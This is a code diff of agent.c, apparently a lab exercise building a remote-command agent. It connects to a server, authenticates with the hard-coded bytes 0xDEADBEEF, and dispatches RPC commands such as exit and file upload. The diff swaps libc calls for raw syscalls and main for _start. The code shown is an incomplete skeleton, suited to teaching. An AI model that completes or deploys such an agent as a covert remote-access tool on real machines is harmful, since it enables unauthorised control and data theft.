@@ -1,8 +1,8 @@
 /* agent.c - Main entry point and command dispatcher */
-#include <stdlib.h> // for socket, exit
-#include <unistd.h> // for write
-#include <sys/socket.h> // for socket, connect
-#include <linux/in.h> // for sockaddr_in
+//#include <stdlib.h> // for socket, exit
+//#include <unistd.h> // for write
+//#include <sys/socket.h> // for socket, connect
+//#include <linux/in.h> // for sockaddr_in
 #include "../inc/cmds.h"
 #include "../inc/config.h"
 #include "../inc/rpc.h"
@@ -17,18 +17,18 @@
 static struct rpc_request g_req;
 static struct rpc_response g_resp;
 
-int main(void) {
+void _start(void) {
     // Your solution here!
     // connect to the serer
     // handle authentication
     // event loop: get RPC Request and execute
     // send 0xDEADBEEF immediately after connecting to server
-    int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
+    int sock_fd = sys_socket(AF_INET, SOCK_STREAM, 0);
     char buf[20];
     // int_to_str(sock_fd, buf, 20);
     // write(1, buf, 20); 
     if (sock_fd < 0) {
-        exit(1);
+        sys_exit(1);
     } 
     
     //write(1, "Socket created\n", strlen("Socket created\n"));
@@ -42,21 +42,21 @@ int main(void) {
     memset(server_addr.sin_zero, 0, 8);
     //write(1, "server_addr set up\n", strlen("server_addr set up\n"));
 
-    int connected = connect(sock_fd, (struct sockaddr *)&server_addr, 16);
+    int connected = sys_connect(sock_fd, (struct sockaddr *)&server_addr, 16);
     //write(1, "connected\n", strlen("connected\n"));
     if (connected < 0) {
         int_to_str(connected, buf, 20);
-        write(1, buf, 20);
-        exit(1);
+        sys_write(1, buf, 20);
+        sys_exit(1);
     }
 
-    write(1, "Connected\n", strlen("Connected\n"));
+    sys_write(1, "Connected\n", strlen("Connected\n"));
     //exit(0);
 
     static char const passwd[] = "\xDE\xAD\xBE\xEF";
     int sent = send_exact(sock_fd, passwd, sizeof(passwd) - 1);
     if (sent == -1) {
-        exit(1);
+        sys_exit(1);
     }
     
     /*
@@ -147,7 +147,7 @@ int main(void) {
         case CMD_EXIT:
             // no function
             // terminate agent connection
-            exit(0);
+            sys_exit(0);
             break;
         case CMD_UPLOAD_FILE:
             //result = handle_upload_file(sock_fd, g_req.data);
